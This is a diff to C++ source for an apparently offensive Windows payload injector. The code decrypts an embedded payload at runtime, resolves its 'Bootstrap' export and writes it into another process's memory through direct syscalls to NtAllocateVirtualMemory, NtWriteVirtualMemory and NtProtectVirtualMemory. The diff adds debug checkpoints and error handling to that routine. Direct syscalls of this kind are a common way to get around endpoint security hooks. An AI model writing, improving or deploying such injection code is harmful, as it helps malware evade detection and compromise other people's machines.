@@ -4,43 +4,69 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
+#include <iostream>
+
+#ifdef BUILD_API
+#include "../../build/payload_data_ext.hpp"
+#else
 #include "../../build/payload_data.hpp"
+#endif
 #include <sstream>
 
 namespace Injector {
+
+    SIZE_T AlignToPageSize(SIZE_T size) {
+        const SIZE_T PAGE_SIZE = 0x1000; // 4096 bytes
+        return (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+    }
 
     PayloadInjector::PayloadInjector(ProcessManager& process, const Core::Console& console)
         : m_process(process), m_console(console) {}
 
     void PayloadInjector::Inject(const std::wstring& pipeName) {
+        ADD_CHECK_POINT
         m_console.Debug("Deriving runtime decryption keys...");
         LoadAndDecryptPayload();
         m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");
-
+        ADD_CHECK_POINT
         DWORD offset = GetExportOffset("Bootstrap");
         if (offset == 0) {
             throw std::runtime_error("Could not find entry point in payload");
         }
-        
+        ADD_CHECK_POINT
         std::stringstream ss;
         ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
         m_console.Debug(ss.str());
-
+        ADD_CHECK_POINT
         PVOID remoteBase = nullptr;
         SIZE_T payloadSize = m_payload.size();
         SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
-        SIZE_T totalSize = payloadSize + pipeNameSize;
+        SIZE_T totalSize = AlignToPageSize(payloadSize + pipeNameSize);
 
-        m_console.Debug("Allocating memory in target process via syscall...");
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
+        HANDLE handle = m_process.GetProcessHandle();
+        if (handle == nullptr || handle == INVALID_HANDLE_VALUE || handle == NULL) {
+            m_console.Debug("m_process.GetProcessHandle() is null");
+            throw std::runtime_error("m_process.GetProcessHandle() is null");
+        }
+        ADD_CHECK_POINT
+        m_console.Debug("==> Allocating memory in target process via syscall...");
+        // NOTE: compiling as dynamically linked DLL leads to access violations when performing direct syscalls for memory allocation
+        NTSTATUS status = NtAllocateVirtualMemory_syscall(handle, &remoteBase, 0,
                                                           &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (status != 0) throw std::runtime_error("Allocation failed");
+        ADD_CHECK_POINT
+        if (status != 0) {
+            m_console.Error("Memory allocation failed");
+            throw std::runtime_error("Allocation failed");
+        }
+
+        m_console.Debug("Memory allocation successful");
+        ADD_CHECK_POINT
 
         ss.str("");
         ss << "  [+] Memory allocated at 0x" << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
            << " (" << std::dec << (totalSize / 1024) << " KB)";
         m_console.Debug(ss.str());
-
+        ADD_CHECK_POINT
         SIZE_T written = 0;
         status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
                                               m_payload.data(), payloadSize, &written);
@@ -51,6 +77,7 @@ namespace Injector {
                                               (PVOID)pipeName.c_str(), pipeNameSize, &written);
         if (status != 0) throw std::runtime_error("Write params failed");
         m_console.Debug("  [+] Payload + parameters written");
+        ADD_CHECK_POINT
 
         ULONG oldProtect = 0;
         status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
